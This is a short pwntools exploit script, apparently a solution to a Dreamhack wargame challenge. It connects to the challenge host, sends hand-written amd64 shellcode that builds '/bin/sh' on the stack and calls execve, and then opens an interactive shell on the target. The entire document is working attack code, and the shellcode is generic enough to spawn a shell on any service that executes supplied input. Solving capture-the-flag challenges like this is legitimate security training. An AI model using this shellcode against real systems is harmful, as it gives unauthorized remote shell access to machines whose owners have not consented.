from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 18673
r = remote(HOST, PORT)

sh=asm('''
    xor rax, rax
    push rax
    push 0x6e69622f
    push rsp
    pop rdi
    push 0x68732f
    pop rax
    xchg [rdi+4], rax
    xor rdx, rdx
    xor rsi, rsi
    push SYS_execve
    pop rax
    syscall
''')
r.sendline(sh)

r.interactive()